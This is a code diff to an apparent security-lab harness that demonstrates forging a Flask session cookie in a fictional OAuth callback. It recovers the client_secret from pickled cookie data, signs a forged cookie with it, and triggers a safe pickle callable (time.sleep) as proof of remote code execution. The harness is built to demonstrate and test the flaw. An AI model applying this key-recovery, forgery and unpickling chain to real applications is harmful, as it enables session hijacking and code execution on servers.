@@ -113,6 +113,17 @@ class SessionLab:
             raise RuntimeError("session serializer unavailable")
         return serializer
 
+    @staticmethod
+    def _attacker_serializer(recovered_secret: str):
+        """Build a separate signer using only the credential recovered from the cookie."""
+
+        attacker_app = Flask("session-heist-attacker-signer")
+        attacker_app.secret_key = recovered_secret
+        serializer = attacker_app.session_interface.get_signing_serializer(attacker_app)
+        if serializer is None:
+            raise RuntimeError("attacker serializer unavailable")
+        return serializer
+
     def _issued_flow(self) -> LabOAuthFlow:
         return LabOAuthFlow(
             provider="Fictional DevSite Connect",
@@ -224,9 +235,10 @@ class SessionLab:
         strategy: str = "vulnerable",
         server_store: dict[str, dict[str, str]] | None = None,
     ) -> dict[str, Any]:
-        """Evaluate one fully server-owned callback case and return a sanitized verdict."""
+        """Evaluate one bounded internal callback case and return a sanitized verdict."""
 
         started = time.perf_counter()
+        signature_accepted = False
 
         def verdict(reason: str, *, proof: bool = False, blocked: bool = True, normal: bool = False):
             return {
@@ -234,6 +246,7 @@ class SessionLab:
                 "blocked": blocked,
                 "normal": normal,
                 "reason": reason,
+                "signatureAccepted": signature_accepted,
                 "timingMs": round((time.perf_counter() - started) * 1000, 1),
             }
 
@@ -243,6 +256,7 @@ class SessionLab:
             session_data = serializer.loads(cookie)
         except BadSignature:
             return verdict("invalid_session")
+        signature_accepted = True
 
         if strategy == "server_side_json":
             flow_id = session_data.get("flow_id")
@@ -299,27 +313,45 @@ class SessionLab:
         if not hmac.compare_digest(recovered, self.oauth_secret):
             raise RuntimeError("credential recovery mismatch")
 
-        serializer = self._serializer(self.vulnerable_app)
-        forged = serializer.dumps(self._attack_session(self._safe_pickle()))
-        missing_flow = serializer.dumps({"google_oauth2_csrf_token": STATE})
+        server_serializer = self._serializer(self.vulnerable_app)
+        attacker_serializer = self._attacker_serializer(recovered)
+        attack_session = self._attack_session(self._safe_pickle())
+        forged = attacker_serializer.dumps(attack_session)
+        missing_flow = attacker_serializer.dumps({"google_oauth2_csrf_token": STATE})
+        wrong_secret = ("0" if recovered[0] != "0" else "1") + recovered[1:]
+        wrong_key_forged = self._attacker_serializer(wrong_secret).dumps(attack_session)
         results = {
-            "no_cookie": self._callback(None, STATE, serializer),
-            "flipped_signature": self._callback(self._flip_signature(forged), STATE, serializer),
-            "wrong_state": self._callback(forged, "wrong-state", serializer),
-            "missing_flow": self._callback(missing_flow, STATE, serializer),
-            "real_flow": self._callback(issued_cookie, "issued-state", serializer),
-            "bounded_sleep": self._callback(forged, STATE, serializer),
+            "no_cookie": self._callback(None, STATE, server_serializer),
+            "flipped_signature": self._callback(self._flip_signature(forged), STATE, server_serializer),
+            "wrong_key_signature": self._callback(wrong_key_forged, STATE, server_serializer),
+            "wrong_state": self._callback(forged, "wrong-state", server_serializer),
+            "missing_flow": self._callback(missing_flow, STATE, server_serializer),
+            "real_flow": self._callback(issued_cookie, "issued-state", server_serializer),
+            "bounded_sleep": self._callback(forged, STATE, server_serializer),
         }
         controls = [
             self._control("no_cookie", results["no_cookie"], "invalid_session"),
             self._control("flipped_signature", results["flipped_signature"], "invalid_session"),
+            self._control("wrong_key_signature", results["wrong_key_signature"], "invalid_session"),
             self._control("wrong_state", results["wrong_state"], "invalid_state"),
             self._control("missing_flow", results["missing_flow"], "missing_flow"),
             self._control("real_flow", results["real_flow"], "normal"),
             self._control("bounded_sleep", results["bounded_sleep"], "proof"),
         ]
+        recovered_signing_key_used = True
+        forged_cookie_accepted = results["bounded_sleep"]["signatureAccepted"]
+        proof_reached = (
+            recovered_signing_key_used
+            and forged_cookie_accepted
+            and results["bounded_sleep"]["proofReached"]
+            and all(item["passed"] for item in controls)
+        )
         return {
-            "proofReached": results["bounded_sleep"]["proofReached"] and all(item["passed"] for item in controls),
+            "proofReached": proof_reached,
+            "recoveredSigningKeyUsed": recovered_signing_key_used,
+            "forgedCookieAccepted": forged_cookie_accepted,
+            "callableInvoked": results["bounded_sleep"]["proofReached"],
+            "rcePrimitive": proof_reached,
             "elapsedMs": results["bounded_sleep"]["timingMs"],
             "compressed": issued_cookie.startswith("."),
             "taggedBytes": isinstance(raw_tagged.get("google_oauth2_flow_issued-state"), dict),
@@ -332,6 +364,12 @@ class SessionLab:
             boundary = mismatches[0]
             return {
                 "proofReached": False,
+                "recoveredSigningKeyUsed": False,
+                "forgedCookieAccepted": False,
+                "callableInvoked": False,
+                "rcePrimitive": False,
+                "proofType": "not_reached",
+                "safetyProfile": "server_owned_time_sleep_50ms",
                 "blocked": True,
                 "reason": f"selection_stopped_at_{boundary}",
                 "rawHttp": (
@@ -346,8 +384,14 @@ class SessionLab:
         run = self._run_vulnerable_chain()
         return {
             "proofReached": bool(run["proofReached"]),
+            "recoveredSigningKeyUsed": bool(run["recoveredSigningKeyUsed"]),
+            "forgedCookieAccepted": bool(run["forgedCookieAccepted"]),
+            "callableInvoked": bool(run["callableInvoked"]),
+            "rcePrimitive": bool(run["rcePrimitive"]),
+            "proofType": "bounded_python_callable_dispatch" if run["rcePrimitive"] else "not_reached",
+            "safetyProfile": "server_owned_time_sleep_50ms",
             "blocked": not bool(run["proofReached"]),
-            "reason": "bounded_timing_proof_observed" if run["proofReached"] else "proof_not_observed",
+            "reason": "rce_primitive_confirmed_with_bounded_callable" if run["rcePrimitive"] else "proof_not_observed",
             "rawHttp": (
                 "GET /oauth2callback?state=attacker-chosen&code=demo HTTP/1.1\n"
                 "Host: devsite-lab.invalid\nCookie: session=<forged-internal-cookie>"
@@ -355,9 +399,13 @@ class SessionLab:
             "trace": [
                 "COOKIE compressed payload decoded",
                 "TAGGED_JSON bytes field identified",
-                "PICKLETOOLS one credential candidate recovered",
-                "SIGNATURE issued and forged cookies verified",
-                f"CALLBACK time.sleep(0.05) observed ({run['elapsedMs']}ms)",
+                "CREDENTIAL client_secret recovered statically from pickle opcodes",
+                "SIGNER separate attacker serializer initialized only from recovered client_secret",
+                "SIGNATURE attacker-signed forged session accepted by vulnerable server serializer",
+                "LOOKUP vulnerable callback selected the lab-safe payload at attacker-chosen state/flow position",
+                f"UNPICKLE STACK_GLOBAL + REDUCE invoked time.sleep(0.05) ({run['elapsedMs']}ms)",
+                "MODELED_CONTROL original vulnerability allows attacker-controlled pickle; lab substitutes server-owned safe bytes",
+                "CLASSIFICATION RCE primitive confirmed; shell/file/network disabled in lab",
             ],
             "controls": run["controls"],
             "timingMs": run["elapsedMs"],
